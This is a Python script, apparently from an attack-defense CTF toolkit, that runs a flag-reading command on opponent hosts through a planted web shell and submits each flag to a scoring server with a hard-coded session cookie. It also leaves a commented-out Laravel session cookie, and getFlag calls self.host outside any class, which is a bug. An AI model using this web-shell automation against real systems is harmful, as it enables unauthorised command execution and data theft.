# -*- coding: utf-8 -*-
import requests
import sys
sys.path.append('../..')
from modules.execute import execute_command,ExecuteFailException
from configuration import configuration
from utils import Utils
import json

# cookies = {
#     'io': 'Z1gEjCUufE54J7vCAAK_',
#     'laravel_session': 'eyJpdiI6IitoTGI5ME9Wb1wvS3lQQ0FKMnhzcHZnPT0iLCJ2YWx1ZSI6IllWQkd6ZHQwczAwQkFGRjdVMDdXT0ZrTTBZR240a1FOMUhvR1lKTHdrMzVaUW5aeFhJaUIwSm1DcUw4N2JXeXZaa0FLMmhhcWR5XC9TVGFTZlFzMzh0UT09IiwibWFjIjoiOWJjN2UyYmVhZTlkMTU2NDdlMjQzNjZjODNhNTkyM2I5OTRkMWQyMjg4NTFhMzc0ZWZlYzdmYjcwZjM0NWUyNiJ9'
# }

class GetFlagException(Exception):
    '''get flag exception'''

class SendFlagException(Exception):
    '''send flag exception'''


def score(host):
    try:
        flag = getFlag(host)
        res = sendFlag(flag)
        return 1,host,res
    except GetFlagException:
        return 0,host,"get flag fail"
    except SendFlagException:
        return 0,host,"send flag fail"

def sendFlag(flag):
    try:
        burp0_url = "http://192.168.100.1/Title/TitleView/savecomprecord"
        burp0_cookies = {"PHPSESSID": "brnjsvl35eebgre17h5k28mqh0"}
        burp0_headers = {"Accept": "*/*", "Origin": "http://192.168.100.1", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://192.168.100.1/", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
        burp0_data = {"answer": flag}
        res = requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data)
        jsres = json.loads(res.text)
        return jsres['msg']
    except:
        raise

def getFlag(host):
    try:
        shellPath = 'http://'+host+configuration.shellLocations[0]
        flag = execute_command(shellPath,Utils.getPassword(self.host),configuration.flagCommand,configuration.phpFunction)
        if flag:
            return flag
        else:
            raise GetFlagException
    except:
        raise GetFlagException